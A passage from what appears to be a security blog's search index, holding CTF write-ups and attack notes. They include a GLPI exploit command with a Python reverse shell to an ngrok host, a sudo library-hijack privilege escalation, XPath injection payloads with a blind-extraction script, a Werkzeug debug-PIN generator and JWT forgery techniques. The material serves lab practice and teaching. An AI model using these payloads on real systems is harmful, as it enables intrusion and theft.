système et réseau, car cela permet de diagnostiquer des problèmes et d’optimiser les connexions réseau." }, { "title": "Notes | Systeme | Processus de démarrage d'un ordinateur", "url": "/Notes/Systeme/boot_process", "categories": "Notes, Systeme", "tags": "Notes, Systeme", "date": "2024-10-03 00:00:00 +0200", "snippet": "Le démarrage d’un ordinateur suit une série d’étapes essentielles qui permettent de passer du matériel allumé au système d’exploitation entièrement opérationnel. Ce processus est standardisé mais peut varier légèrement selon le type de firmware (BIOS ou UEFI) et le système d’exploitation utilisé (Windows, Linux, ou macOS).1. L’alimentation et le démarrage matérielLe processus commence lorsque l’utilisateur allume l’ordinateur via le bouton d’alimentation. Le bloc d’alimentation convertit le courant alternatif en courant continu et fournit l’énergie nécessaire à tous les composants, notamment la carte mère, le processeur (CPU), la mémoire vive (RAM), et les périphériques de stockage.2. Chargement du BIOS ou de l’UEFILe CPU, activé dès que l’alimentation est stable, recherche immédiatement un petit programme situé dans une mémoire ROM sur la carte mère : c’est le BIOS (Basic Input/Output System) ou l’UEFI (Unified Extensible Firmware Interface). Ce programme est responsable de charger les paramètres de configuration du système, qui sont modifiables via l’interface de configuration. Ces paramètres sont stockés sur une mémoire non volatile appelée CMOS (Complementary Metal-Oxide-Semiconductor) ou une mémoire flash sur la cartes mères modernes.3. Test et initialisation du matériel : POSTLe BIOS ou l’UEFI exécute ensuite le POST (Power On Self Test), une série de tests qui vérifient que les composants matériels, tels que la RAM, le processeur, et les périphériques, fonctionnent correctement. Si une anomalie est détectée, l’ordinateur émet généralement un signal sonore d’alerte.4. Recherche d’un périphérique de démarrageUne fois le POST terminé avec succès, le BIOS ou l’UEFI recherche un périphérique de démarrage. Cela peut être un disque dur, un SSD, ou même un périphérique externe (comme une clé USB). Les utilisateurs peuvent configurer la séquence de démarrage dans les paramètres du BIOS ou de l’UEFI.4.1. BIOS et MBR (Master Boot Record)Dans les anciens systèmes utilisant le BIOS, le périphérique de démarrage doit contenir un MBR (Master Boot Record) sur les premiers secteurs du disque. Ce MBR (512 octets) contient un petit programme appelé “chargeur de démarrage”, qui est chargé en mémoire et qui commence à démarrer le système d’exploitation.4.2. UEFI et EFI System Partition (ESP)Dans les systèmes plus récents, l’UEFI remplace le MBR par une partition système EFI (ESP), où sont stockés des fichiers exécutables pour démarrer le système d’exploitation. L’UEFI peut vérifier la signature de ces fichiers via le mécanisme de Secure Boot, afin de s’assurer que le système n’a pas été altéré.5. Chargement du chargeur de démarrageLe BIOS ou l’UEFI trouve le programme de démarrage (bootloader) soit dans le MBR (BIOS) ou dans la partition EFI (UEFI). Le rôle du chargeur de démarrage est de charger le noyau du système d’exploitation en mémoire.5.1. Windows : Bootmgfw.efiSur les systèmes Windows, avec UEFI, le fichier Bootmgfw.efi est chargé, qui à son tour cherche sur la partition “Windows boot” et exécute le chargeur de système d’exploitation winload.efi.Si MBR est utilisé, le gestionnaire de démarrage bootmgr.exe est chargé depuis la partition système. Celui-ci cherche le chargeur de démarrage winload.exe dans /windows/system32 et l’exécute.Winload charge les pilotes matériels essentiels (marqués “BOOT_START”) et lance le noyau Windows ntoskrnl.exe.Une fois le noyau lancé, il démarre le processus de gestion des sessions (Smss.exe). Celui-ci démarre la session système et charge des pilotes supplémentaires.Il démarre ensuite les services d’arrière-plan et prépare l’ordinateur pour l’utilisation (écran d’accueil, etc.).5.2. Linux : GRUBLa plupart des distributions Linux utilisent GRUB (GRand Unified Bootloader). GRUB gère la gestion du chargement des systèmes d’exploitation sur le système.Source de l’image1. InitialisationLecture de la configuration: GRUB consulte son fichier de configuration principal (/boot/grub/grub.cfg) pour connaître les paramètres de démarrage.### 2. Menu de démarrageAffichage du menu:Si plusieurs noyaux ou systèmes d’exploitation sont disponibles, GRUB affiche un menu où l’utilisateur peut choisir celui à démarrer.Gestion des systèmes multiboot : Si d’autres systèmes d’exploitation sont installés, GRUB peut les charger via un mécanisme de “chain loading”, notamment pour des OS comme Windows​.3. Chargement du noyau en mémoireAccès au noyau:GRUB localise le noyau Linux dans le répertoire /boot (par exemple, vmlinuz-x.x.x) en utilisant ses capacités intégrées de lecture des systèmes de fichiers.Chargement du noyau : Une fois trouvé, le fichier du noyau est chargé en mémoire vive (RAM). GRUB transmet alors au noyau plusieurs paramètres initiaux nécessaires à son bon fonctionnement.4. Transmission des paramètres initiauxinitramfs (Initial RAM Filesystem): GRUB charge également le fichier initramfs (ou initrd), qui contient les pilotes et les modules nécessaires pour que le noyau puisse détecter le matériel et monter le système de fichiers racine plus tard.Système de fichiers racine: GRUB spécifie la partition où se trouve le système de fichiers racine (exemple : /dev/sda1) et transmet cette information au noyau via l’option root dans la configuration.Autres paramètres : GRUB peut aussi transmettre des options comme ro (monter le système de fichiers en lecture seule) et quiet (réduire l’affichage des messages pendant le démarrage).5. Transfert de contrôle au noyauDémarrage du noyau: Après avoir chargé le noyau et les fichiers initramfs, GRUB transfère le contrôle complet au noyau Linux, qui poursuit l’initialisation du système.Montage du système de fichiers racine : Le noyau utilise l’initramfs pour charger les pilotes nécessaires afin de détecter les périphériques de stockage et monter le véritable système de fichiers racine.Le noyau démarre le système init. Celui-ci est systemd sur la plupart des distributions Linux modernes (init est configurable dans le fichier /etc/inittab). Celui-ci gère les services de démarrage et les autres processus utilisateur qui mènent à un invite de connexion.5.3. macOS : boot.efiSur un Mac, le fichier boot.efi est utilisé pour charger le noyau macOS, et le système continue de se charger de manière similaire à Windows ou Linux. (Section à compléter plus tard)ConclusionLe processus de démarrage d’un ordinateur est un enchaînement complexe mais bien structuré, reliant matériel et logiciel. Chaque étape est cruciale pour garantir que le système soit prêt à être utilisé. Que vous utilisiez Windows, Linux, ou macOS, les fondamentaux restent similaires, avec quelques différences notables en fonction du firmware et du type de système d’exploitation.Sources utilisées Démarrage d’un PC sous Windows - Yannick Teach Que se passe-t-il exactement lorsque vous allumez votre ordinateur? - azurplus Démarrage du système Linux - François Goffinet Démarrer (sous) LINUX - Jean-Luc Massat Processus de démarrage, Init et arrêt - RedHat Booting process of Linux - Wikipedia Étapes du démarrage d’un système Linux - developpez" }, { "title": "CTFs | CTF-inter-INSA2024 | Realist | Uptodate", "url": "/CTFs/CTF-inter-INSA2024/realist/uptodate", "categories": "CTFs, CTF-inter-INSA2024, Realist", "tags": "CTFs, CTF-inter-INSA2024, Realist", "date": "2024-04-05 00:00:00 +0200", "snippet": "Let’s run nmap on the target:There is one open port: 80 -&gt; websiteThe website is running drupal which is an open source CMS.We can find out the version of the CMS:I found an exploit on github to get a web shell.I used it to launch a reverse shell with a reverse shell. I used ngrok and netcat as listeners. Then I stabilized the shell.In the /home/debian directory, we get the user flag.After searching for 1 hour, I found out that the password of debian is “debian” 😅.The user www-data can execute /home/debian/ping.py with sudo.The ping.py script import the requests library. Since we control the debian home folder, we can create a requests.py folder to library hijacking.We create a requests.py scripts in /home/debianimport osos.system(\"/bin/bash\")We get back to the www-data session and run sudo /home/debian/ping.pyWe get a root shell and the flag" }, { "title": "CTFs | CTF-inter-INSA2024 | Realist | Gestion de parc", "url": "/CTFs/CTF-inter-INSA2024/realist/gestion_de_parc", "categories": "CTFs, CTF-inter-INSA2024, Realist", "tags": "CTFs, CTF-inter-INSA2024, Realist", "date": "2024-04-05 00:00:00 +0200", "snippet": "Let’s run nmap on the target:There are 2 open ports: 22 -&gt; ssh 80 -&gt; websiteThe website is running glpi which is an open source IT Asset Management, issue tracking system and service desk system.I do not have the exact version of the software. After testing several exploits, I found online that the default credentials are glpi:glpi.I logged in !After searching for a while, I found an exploit on github to get RCE unauthenticated. Well I did not need the credentials 😅.I started a ngrok and a listener, modified the script and launched a reverse shell.python3 CVE-2022-35914.py -u http://172.10.0.52 -c \"export RHOST=\\\"0.tcp.eu.ngrok.io\\\";export RPORT=12157;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\\\"RHOST\\\"),int(os.getenv(\\\"RPORT\\\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"sh\\\")'\"Now we stabilize it:python3 -c 'import pty;pty.spawn(\"/bin/bash\")'CTRL + Zstty raw -echo; fgexport TERM=xtermWe get the user flag in the /home/user directory:The second challenge asks us to get the previous password of the mysql database.The notes.txt file suggest that there is a backup of the website and we can access it.I copy the archive to a writable directory.cp /root/glpi.zip /tmp/archive/unzip glpi.zipIn the config_db.php file, we get the previous mysql db password:Fact: The current password of the db is also the user’s password." }, { "title": "CTFs | CTF-inter-INSA2024 | Realist | Admin Files", "url": "/CTFs/CTF-inter-INSA2024/realist/admin_files", "categories": "CTFs, CTF-inter-INSA2024, Realist", "tags": "CTFs, CTF-inter-INSA2024, Realist", "date": "2024-04-05 00:00:00 +0200", "snippet": "Let’s run nmap on the target:There are 2 ports open: 22 -&gt; ssh 80 -&gt; websiteOn the web site is run with the elfinder software which is an open-source file manager for web.There is one file on the website named CredsE.txt which contains credentials encoded with ROT.We decode it with Cyberchef and get the debian credentials:We connect as debian and get the user flag.debian can /usr/bin/python with sudo permissions so the privesc is quite easy.We’ve got the root flag 🎉" }, { "title": "Notes | Web | XPATH injection", "url": "/Notes/Web/xpath", "categories": "AxelInsa.github.io, _posts, Notes", "tags": "AxelInsa.github.io, _posts, Notes", "date": "2024-01-30 00:00:00 +0100", "snippet": "IntroductionXPath (XML Path Language) injections pose a significant threat to web applications that use XML databases. Similar to SQL injection attacks, XPath injections involve manipulating XPath queries to extract sensitive information from XML databases. In this article, we will delve into the structure of XPath, explore XPath injections, and discuss mitigation strategies to secure applications against such attacks.XPath FormatTo comprehend XPath injections, it’s crucial to understand the XML standard and XPath language. XML (eXtensible Markup Language) is a markup language developed by the World Wide Web Consortium for describing data in the form of XML documents. XPath, an XML Path Language, allows selecting information within an XML document by referencing data such as text, elements, and attributes.Let’s examine a simple XML document to illustrate its structure:&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;data&gt;&lt;user&gt; &lt;name&gt;pepe&lt;/name&gt; &lt;password&gt;peponcio&lt;/password&gt; &lt;account&gt;admin&lt;/account&gt;&lt;/user&gt;&lt;user&gt; &lt;name&gt;mark&lt;/name&gt; &lt;password&gt;m12345&lt;/password&gt; &lt;account&gt;regular&lt;/account&gt;&lt;/user&gt;&lt;user&gt; &lt;name&gt;fino&lt;/name&gt; &lt;password&gt;fino2&lt;/password&gt; &lt;account&gt;regular&lt;/account&gt;&lt;/user&gt;&lt;/data&gt;In this example, the XML document describes users with elements like name, password, account type.Queries typeAll names - [pepe, mark, fino]name//name//name/node()//name/child::node()user/nameuser//name/user/name//user/nameAll values - [pepe, peponcio, admin, mark, ...]//user/node()//user/child::node()Positions//user[position()=1]/name #pepe//user[last()-1]/name #mark//user[position()=1]/child::node()[position()=2] #peponcio (password)Functionscount(//user/node()) #3*3 = 9 (count all values)string-length(//user[position()=1]/child::node()[position()=1]) #Length of \"pepe\" = 4substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --&gt; \"a\"AuthenticationExemple of query for authentication:string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())payloads to put in both fields to get the first account:' or '1'='1\" or \"1\"=\"1' or ''='\" or \"\"=\"This will give the following query, equivalent to 1=1 and 1=1:string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())To select an particular account, select the account using the username and use one of the previous values in the password field.Abusing null injectionIn some cases, it is possible to bypass the password verification using a null byte.Username: ' or 1]%00It will form the following query://user[name/text()='' or 1Double OR in Username or in passwordIt enables to have a valid query with only one vulnerable field.Payloads:Bypass with first match(This requests are also valid without spaces)' or /* or '' or \"a\" or '' or 1 or '' or true() or 'So you will get this type of query that will match true:string(//user[name/text()='' or true() or '' and password/text()='']/account/text())Select account'or contains(name,'adm') or' #Select first account having \"adm\" in the name'or contains(.,'adm') or' #Select first account having \"adm\" in the current value'or position()=2 or' #Select 2º accountYou will get this type of query:// This will probably connect you as \"admin\" if the account existsstring(//user[name/text()=''or contains(name,'adm') or'' and password/text()='']/account/text())Select account (name known)admin' or 'admin' or '1'='2Resulting query:string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())This is equivalent to: name='admin' or (false and password='') &lt;=&gt; name='admin' or false &lt;=&gt; name='admin'This will connect you as admin (if the account exists) whatever the password is.String extractionIf the output contains strings and the user can manipulate the values to search. Example: a search bar to search for username./user/username[contains(., '+VALUE+')]') or 1=1 or (' #Get all names') or 1=1] | //user/password[('')=(' #Get all names and passwords') or 2=1] | //user/node()[('')=(' #Get all values')] | //./node()[('')=(' #Get all values')] | //node()[('')=(' #Get all values') or 1=1] | //user/password[('')=(' #Get all names and passwords')] | //password%00 #All names and passwords (abusing null injection)')] | //user/*[1] | a[(' #The ID of all users')] | //user/*[2] | a[(' #The name of all users')] | //user/*[3] | a[(' #The password of all users')] | //user/*[4] | a[(' #The account of all usersBlind ExplotationTo find the length of a value:// bool value' and string-length(password)=5// You can also use dichotomy to go faster' and string-length(password)&lt;5To find the value of a character:'and substring(password,&lt;position_of_the_character&gt;,1)='a'// Test if the first character of the password is 'a''and substring(password,1,1)='a'Exampleimport requests, string flag = \"\"l = 0alphabet = string.ascii_letters + string.digits + \"{}_()\"for i in range(30): r = requests.get(\"http://example.com?action=user&amp;userid=2 and string-length(password)=\" + str(i)) if (\"TRUE_COND\" in r.text): l = i break print(\"[+] Password length: \" + str(l)) for i in range(1, l + 1): #print(\"[i] Looking for char number \" + str(i)) for al in alphabet: r = requests.get(\"http://example.com?action=user&amp;userid=2 and substring(password,\"+str(i)+\",1)=\"+al) if (\"TRUE_COND\" in r.text): flag += al print(\"[+] Flag: \" + flag) breakToolxcatMitigationsDefending against XPath Injection is essentially similar to defending against SQL injection. Theapplication must sanitize user input. Specifically, the single and double quote characters should bedisallowed." }, { "title": "Notes | Web | Flask", "url": "/Notes/Web/flask", "categories": "Notes, Web", "tags": "Notes, Web", "date": "2024-01-27 00:00:00 +0100", "snippet": "CookiesDefault cookie session name is “session”.Flask-unsignCommand line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys.To install it:pip3 install flask-unsignDecode cookieflask-unsign --decode --cookie '&lt;cookie&gt;'Brute force secretflask-unsign --unsign --wordlist &lt;wordlist&gt; --cookie '&lt;cookie&gt;' --no-literal-evalSign cookieflask-unsign --sign --cookie \"{'admin': 'true', 'username': 'admin' }\" --secret 'CHANGEME'WerkzeugFlask is implemented on Werkzeug and Jinja2.Werkzeug is a collection of libraries that can be used to create a WSGI (Web Server Gateway Interface) compatible web application in Python. A WSGI (Web Server Gateway Interface) server is necessary for Python web applications since a web server cannot communicate directly with Python.Console RCEIf debug is active you could try to access to /console and gain RCE.__import__('os').popen('whoami').read();In some occasions the /console endpoint is going to be protected by a pin. If you have a file traversal vulnerability, you can leak all the necessary info to generate that pin.Looking at “python3.5/site-packages/werkzeug/debug/init.py”, we can find out how the PIN is generated.probably_public_bits = [ username, modname, getattr(app, '__name__', getattr(app.__class__, '__name__')), getattr(mod, '__file__', None),]private_bits = [ str(uuid.getnode()), get_machine_id(),]You will need these information:probably_public_bits username: user that started the Flask app. Maybe you can guess looking at “/proc/self/environ” modname: is flask.app getattr(app, ‘name’, getattr(app.class, ‘name’)): is Flask getattr(mod, ‘file’, None): absolute path of “app.py”. Exemple: “/usr/local/lib/python3.5/dist-packages/flask/app.py”. Use the file traversal vulnerability to confirm your path is correct.private_bits uuid.getnode(): MAC address of the current computer. To find it, search which network interface is used to serve the app. You can leak it from “/proc/net/arp”. (Exemple: eth0).Then leak the MAC address from “/sys/class/net/&lt;device id&gt;/address”. You now have to convert from hexadecimal to decimal. Exemple: 56:00:02:7a:23:ac -&gt; print(0x5600027a23ac) -&gt; 94558041547692. concatenate the values in “/etc/machine-id” (or “/proc/sys/kernel/random/boot_id” if “/etc/machine-id” does not exist) with the value after the last “/” of the first line of “/proc/self/cgroup”.Then enter the values in this beautiful code and run it to get the PIN (credits to Hacktricks and BatBato):#Made with &lt;3 by BatBatoimport hashlibimport itertoolsfrom itertools import chaindef crack_sha1(username, modname, appname, flaskapp_path, node_uuid, machine_id): h = hashlib.sha1() crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)def crack(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_id): probably_public_bits = [ username, modname, appname, flaskapp_path ] private_bits = [ node_uuid, machine_id ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\"utf-8\") h.update(bit) h.update(b\"cookiesalt\") # If we need to generate a pin we salt it a bit more so that we don't # end up with the same value and generate out 9 digits num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] # Format the pincode in groups of digits for easier remembering if # we don't have a result yet. rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \"-\".join( num[x : x + group_size].rjust(group_size, \"0\") for x in range(0, len(num), group_size) ) break else: rv = num print(rv)if __name__ == '__main__': usernames = ['web-app'] # username /proc/self/environ modnames = ['flask.app'] appnames = ['Flask'] flaskpaths = ['/home/web-app/.local/lib/python3.11/site-packages/flask/app.py'] nodeuuids = ['2485377892359']# str(uuid.getnode()), /proc/net/arp =&gt; get device name (ex:eth0) =&gt;/sys/class/net/&lt;device id&gt;/address (ex:56:00:02:7a:23:ac) =&gt; print(0x5600027a23ac) machineids = ['ef4b22e3-e1ed-44b6-a2a3-a2daf63f4019user.slice']# get_machine_id(), /etc/machine-id or /proc/sys/kernel/random/boot_id and the value after the last \"/\" of the first line of \"/proc/self/cgroup\". # Generate all possible combinations of values combinations = itertools.product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids) # Iterate over the combinations and call the crack() function for each one for combo in combinations: username, modname, appname, flaskpath, nodeuuid, machineid = combo print('==========================================================================') crack_sha1(username, modname, appname, flaskpath, nodeuuid, machineid) print(f'{combo}') print('==========================================================================')" }, { "title": "Notes | Web | JWT", "url": "/Notes/Web/jwt", "categories": "Notes, Web", "tags": "Notes, Web", "date": "2024-01-24 00:00:00 +0100", "snippet": "IntroductionJSON Web Tokens (JWTs) have become a standard for transmitting cryptographically signed JSON data between systems. Primarily used for authentication, session handling, and access control, JWTs offer a decentralized approach, storing necessary information client-side. This guide will delve into the format, components, security, potential attacks, and countermeasures associated with JWTs.JWT FormatA JWT comprises three parts (base64 encoded): a header, a payload, and a signature, separated by dots. The header contains metadata, while the payload holds user claims. The signature, derived from hashing the header and payload, ensures data integrity and authenticity.Example JWT:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0OTAyMn0.bVZZls9tsMF0muy1gw5LH5depDZmRCp7iykkdhVewD4Decoding the payload reveals claims:{ \"name\": \"John Doe\", \"iat\": 1516239022, \"exp\": 1516249022}JWT SignatureThe server generates the signature by hashing the header and payload, enhancing security. A compromised signature jeopardizes data integrity and authenticity. Proper signature verification is crucial for a robust JWT mechanism.JWT vs JWS vs JWEJWT, as a specification, is extended by JSON Web Signature (JWS) and JSON Web Encryption (JWE). JWTs are often synonymous with JWS tokens, where JWEs encrypt token contents.JWT AttacksJWT attacks involve manipulating tokens to bypass authentication and access controls. Successful attacks can lead to privilege escalation and impersonation.ImpactJWT attacks can have severe consequences, granting attackers unauthorized access and control over user accounts.VulnerabilitiesFlawed JWT handling in applications introduces vulnerabilities. Common issues include improper signature verification, accepting unsigned tokens, and weak key management.Exploiting FlawsExploiting flawed signature verification allows attackers to modify token values, potentially leading to unauthorized access and privilege escalation.Example:{ \"username\": \"guest\", \"isAdmin\": false}If the “username” is used to identify sessions, modifying it would allow us to impersonate a user. Similarly, the “isAdmin” parameter could be used for access control. Setting “isAdmin” to true could allow us to perform privilege escalation.Accepting Tokens with No SignatureServers trusting tokens without signatures (unsecured JWTs) can be exploited by attackers, bypassing security measures. If the server does not verify the signature, we can set the “alg” parameter in the header to “none”.{ \"alg\": \"none\", \"typ\": \"JWT\"} Note that we still need to add a dot at the end of the payload even if there is no signature.Brute-forcing Secret KeysWeakly managed secret keys, especially in algorithms like HS256, pose a threat. Developers may overlook changing default or placeholder secrets, enabling attackers to brute-force keys.You can brute-force it using Hashcat.hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;One you know the secret, you can use it to sign your own tokens.I recommend using jwt.io (really good to understand jwt format) or the JWT Editor extension of Burp Suite which is a very powerful tool.Header Parameter InjectionsUser-controllable parameters like jwk, jku, and kid can be exploited to inject self-signed JWTs or manipulate key references, compromising security. jwk (JSON Web Key) - Provides an embedded JSON object representing the key. jku (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key. kid (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.JWKA JWK (JSON Web Key) is a standardized format for representing keys as a JSON object.Example:{ \"kid\": \"ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\", \"typ\": \"JWT\", \"alg\": \"RS256\", \"jwk\": { \"kty\": \"RSA\", \"e\": \"AQAB\", \"kid\": \"ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\", \"n\": \"yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m\" }}Server Behavior: Misconfigured servers may use any key embedded in the jwk parameter.Exploitation: Exploit by signing a modified JWT using your RSA private key and embedding the matching public key in the jwk header.You can use JWT Editor extension on burp suite to facilitate this process.JKUInstead of embedding public keys with the jwk header parameter, some servers allow the use of the jku (JWK Set URL) header parameter.A JWK Set is a JSON object containing an array of JWKs representing different keys. You can see an example of this below.If the app is misconfigured, JWK Sets may be publicly exposed via standard endpoints like /.well-known/jwks.jsonIf you can modify it, you can add your own public key and sign your token with your own private key. If you specify this key with the jkw parameter, the server will use it to decypher your token.KidServers may use the kid (Key ID) parameter in the JWT header to identify which key to use during signature verification.The kid parameter may point to a specific entry in a database, a file name, or any arbitrary string.Directory TraversalIf the kid parameter is vulnerable to directory traversal, an attacker could force the server to use an arbitrary file as the verification key.Example:{ \"kid\": \"../../path/to/file\", \"typ\": \"JWT\", \"alg\": \"HS256\", \"k\": \"asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc\"}If the server supports symmetrically signed JWTs, an attacker might point to a predictable file, signing the JWT with a secret matching the file’s contents. “/dev/null” is perfect for this as it is empty so easily predictable.Other Interesting ParametersParameters like cty and x5c may introduce additional attack vectors, including content type manipulation (leading to potential XXE or deserialisation problem) and injection of self-signed certificates.JWT Algorithm ConfusionEven with robust secrets, attackers might forge valid JWTs by signing tokens using unexpected algorithms (algorithm confusion attack).Prevention MeasuresUse up-to-date JWT libraries and ensure developers understand their security implications.Perform robust signature verification, accounting for unexpected algorithms.Enforce a strict whitelist for permitted hosts in the jku header.Ensure no path traversal or SQL injection vulnerabilities via the kid header.Best Practices for JWT HandlingAlways set an expiration date for issued tokens.Avoid sending tokens in URL parameters when possible.Include the aud (audience) claim to specify the intended recipient, preventing use on different websites.Enable token revocation on server logout. Note: Adhering to these best practices helps prevent vulnerabilities associated with JWTs." }, { "title": "CTFs | AmateursCTF2023 | Web | Waiting an Eternity", "url": "/CTFs/AmateursCTF2023/web/waiting-an-eternity", "categories": "CTFs, AmateursCTF2023, Web", "tags": "CTFs, AmateursCTF2023, Web", "date": "2023-07-18 00:00:00 +0200", "snippet": "StatementResolutionOn the home page, there is just this message. Nothing else.In the response of the main page, there is a “refresh” header with a url inside.On this new page, there is this message.There is a “time” cookie set.If I set the value of the cookie to 0 and refresh the page, the message changes.Since we have to wait for an “eternity”, I set the “time” cookie to a high negative value (-1e1000000) and refresh the page.We get the flag !!This challenge is an introduction to the concept of headers and cookies. I hope you have learned something with this writeup 😊." }, { "title": "CTFs | AmateursCTF2023 | Web | Funny Factorials", "url": "/CTFs/AmateursCTF2023/web/funny_factorials", "categories": "CTFs, AmateursCTF2023, Web", "tags": "CTFs, AmateursCTF2023, Web", "date": "2023-07-18 00:00:00 +0200", "snippet": "StatementWebsiteHere is the main page.We can calculate the factorial of a number (example 3).We can change the theme of the page for cold or warm.Note that the theme is a url parameter (themes/theme2.css) so maybe a LFI vulnerability is present.Application Source CodeFor this challenge, we are given the source code of the app and the Dockerfile.In the dockerfile, we can see that the flag is a root of the container.Here is the function called when we make a GET request on the main page.If the theme parameter is set, it opens it. Else, the theme themes/theme1.css is opened.Then the index.html page is rendered using that theme.We notice that the path to the theme is filtered by the function filter_path.In the filter_path function, the “../” is removed. The thing is that it’s done recursively so if the “….//” trick will not work. After one iteration it will become “../” and after another, it will disappear.When the maximum amount of recursion is achieved, it triggers a Recursion error. If the path begins with “/”, it is removed and the path is returned.So, if we input the path //flag.txt, the first “/” is removed and the path “/flag.txt” is returned so the flag.txt file is used as a theme for the index.html page.If we look at the &lt;style&gt; tag of the return page, we get the flag 🥳!In this app, the lack of proper user input sanitization leads to a LFI vulnerability which allows us to recover the flag.Another way to bypass the filter_path would be to put enough ../ to reach the Python default maximum recursion depth of 1000. I don’t know if an url that long is allowed though. I did not try." }, { "title": "CTFs | 404CTF2023 | Pwn | Cache-cache le retour", "url": "/CTFs/404CTF2023/pwn/cache-cache_le_retour", "categories": "CTFs, 404CTF2023, Pwn", "tags": "CTFs, 404CTF2023, Pwn", "date": "2023-06-15 00:00:00 +0200", "snippet": "ContextWe have to get the content of the file salle_au_tresor.ResolutionFunctionsHere are the functions in the executable. I renamed some to better understand the program.MainHere is the main function:int main(int argc,char **argv){ int iVar1; time_t tVar2; size_t LF_location; long in_FS_OFFSET; char local_7a; undefined local_79; int count; uint local_74; undefined8 num; char *caracters [4]; undefined8 password; undefined8 local_40; undefined4 local_38; undefined local_34; char input [24]; long canary; canary = *(long *)(in_FS_OFFSET + 0x28); setvbuf(stdout,(char *)0x0,2,0); count = 0x14; password = 0; local_40 = 0; local_38 = 0; local_34 = 0; local_7a = 'a'; caracters[0] = \"1234567890\"; caracters[1] = \"abcdefghijklmnoqprstuvwyzx\"; caracters[2] = \"ABCDEFGHIJKLMNOPQRSTUYWVZX\"; caracters[3] = \"!@#$%^&amp;*(){}[]:&lt;&gt;?,./\"; num = 4; tVar2 = time((time_t *)0x0); srand((uint)tVar2); for (; count != 0; count = count + -1) { local_74 = get_char((int)num + -1); local_7a = get_passwd_char(caracters[local_74]); strncat((char *)&amp;password,&amp;local_7a,1); } local_34 = 0; puts(\"[Vous] : Toc toc toc\"); sleep(1); puts(&amp;DAT_00101978); fgets(input,0x15,stdin); LF_location = strcspn(input,\"\\n\"); input[LF_location] = '\\0'; iVar1 = strcmp(input,(char *)&amp;password); local_79 = iVar1 == 0; if ((bool)local_79) { puts(&amp;DAT_001019c8); puts(&amp;DAT_00101a20); puts( \"[Portier] : Vous trouverez facilement, il y a deux gardes devant la porte, au fond du coulo ir.\" ); give_gift(); } else { puts(&amp;DAT_00101ad0); } if (canary != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0;}There are the interesting parts:Password creation :count = 0x14; password = 0; local_40 = 0; local_38 = 0; local_34 = 0; local_7a = 'a'; caracters[0] = \"1234567890\"; caracters[1] = \"abcdefghijklmnoqprstuvwyzx\"; caracters[2] = \"ABCDEFGHIJKLMNOPQRSTUYWVZX\"; caracters[3] = \"!@#$%^&amp;*(){}[]:&lt;&gt;?,./\"; num = 4; tVar2 = time((time_t *)0x0); srand((uint)tVar2); for (; count != 0; count = count + -1) { local_74 = get_char((int)num + -1); local_7a = get_passwd_char(caracters[local_74]); strncat((char *)&amp;password,&amp;local_7a,1); }Password verification:fgets(input,0x15,stdin); LF_location = strcspn(input,\"\\n\"); input[LF_location] = '\\0'; iVar1 = strcmp(input,(char *)&amp;password); local_79 = iVar1 == 0; if ((bool)local_79) { puts(&amp;DAT_001019c8); puts(&amp;DAT_00101a20); puts( \"[Portier] : Vous trouverez facilement, il y a deux gardes devant la porte, au fond du coulo ir.\" ); give_gift(); }Password guessingLet’s take a look at how the password is generated.tVar2 = time((time_t *)0x0);srand((uint)tVar2);for (; count != 0; count = count + -1) { local_74 = get_char((int)num + -1); local_7a = get_passwd_char(caracters[local_74]); strncat((char *)&amp;password,&amp;local_7a,1); }We set the seed of the random with the current timestamp. Then we perform some operations to get the different characters.Here is the get_char function:int get_char(int param_1){ int iVar1; do { iVar1 = rand(); iVar1 = iVar1 / (int)(0x7fffffff / (long)(param_1 + 1)); } while (param_1 &lt; iVar1); return iVar1;}We use the rand function to get an index. Then in the main code, we select the caracters[index] and feed it to the get_passwd_char function.Here is the get_passwd_char function:char get_passwd_char(char *param_1){ int iVar1; size_t sVar2; sVar2 = strlen(param_1); iVar1 = get_char((int)sVar2 + -1); return param_1[iVar1];}We generate a new index and get the character located at caracters[index1][index2].We add the new character to the password. We do it 20 times (variable count = 0x14).What we can do is use gdb to set the timestamp in the future, generate the password and display the password. This way, we have a password that will be valid later in the future.Now we send a request every second to the server until the password is the good one.gdb code to get the password that will be valid in 30 seconds:set disassembly-flavor intelbreak *0x5555554016a5commands silent print($rax) set $rax += 30 print($rax) continueendbreak *0x5555554016ffcommands silent set $pass = (char *) $rbp -0x40 print($pass) quitendrunWe increase the timestamp by 30 then we display the password.Code to spam requests:from pwn import *import timewhile True: #p = process(\"./cache_cache_le_retour\") p = remote(\"challenges.404ctf.fr\",31725) password = b'6qzQbN(m&gt;@KROp^1(Gh:' p.recvuntil(b\"mot de passe ?\\n\") p.sendline(password) sms = p.recv() if b'Je me vois au regret de refuser' in sms: p.close() #time.sleep(0.6) continueprint('terminate')p.interactive()Now the give a gift function is executed.Here is the give_a_gift function:undefined8 give_gift(void){ __pid_t _Var1; int iVar2; 